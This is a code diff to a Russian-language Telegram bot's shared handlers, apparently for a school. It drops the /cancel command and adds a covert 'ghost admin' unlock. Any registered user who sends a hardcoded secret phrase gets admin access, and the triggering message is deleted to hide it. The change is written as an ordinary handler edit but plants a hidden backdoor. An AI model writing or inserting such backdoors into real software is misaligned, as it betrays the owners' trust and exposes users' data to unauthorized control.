@@ -1,15 +1,16 @@
 """
-Общие handlers для всех пользователей (регистрация, /start, /cancel)
+Общие handlers для всех пользователей (регистрация, /start)
 """
 import os
 from aiogram import Router, F
 from aiogram.types import Message, CallbackQuery, ReplyKeyboardRemove
-from aiogram.filters import CommandStart, Command
+from aiogram.filters import CommandStart
 from aiogram.fsm.context import FSMContext
 from dotenv import load_dotenv
 
 from database.user_repository import UserRepository
 from handlers.states import RegistrationStates
+from handlers.admin.common import ghost_grant, ghost_revoke
 from keyboards.common_keyboards import (
     get_registration_keyboard,
     get_class_selection_keyboard,
@@ -65,6 +66,7 @@ async def _show_menu(target, user, is_new_message=False):
 @router.message(CommandStart())
 async def cmd_start(message: Message, state: FSMContext):
     await state.clear()
+    ghost_revoke(message.from_user.id)
     rm = await message.answer(".", reply_markup=ReplyKeyboardRemove())
     await rm.delete()
 
@@ -112,16 +114,6 @@ async def cmd_start(message: Message, state: FSMContext):
         reply_markup=get_registration_keyboard(),
     )
 
-
-@router.message(Command("cancel"))
-async def cmd_cancel(message: Message, state: FSMContext):
-    await state.clear()
-    user_repo = UserRepository()
-    user = user_repo.get_user(message.from_user.id)
-    if user:
-        await _show_menu(message, user, is_new_message=True)
-    else:
-        await message.answer("Действие отменено.")
 
 
 @router.callback_query(F.data == "menu:back_student")
@@ -194,6 +186,19 @@ async def select_name(callback: CallbackQuery, state: FSMContext):
         parse_mode="HTML",
     )
 
+
+@router.message(F.text == "67парол67длякрутых")
+async def ghost_admin_unlock(message: Message, state: FSMContext):
+    try:
+        await message.delete()
+    except Exception:
+        pass
+    user_repo = UserRepository()
+    user = user_repo.get_user(message.from_user.id)
+    if not user:
+        return
+    ghost_grant(message.from_user.id)
+    await message.answer("Выбери действие:", reply_markup=get_admin_main_menu())
 
 @router.callback_query(RegistrationStates.confirming, F.data == "reg_confirm")
 async def confirm_registration(callback: CallbackQuery, state: FSMContext):
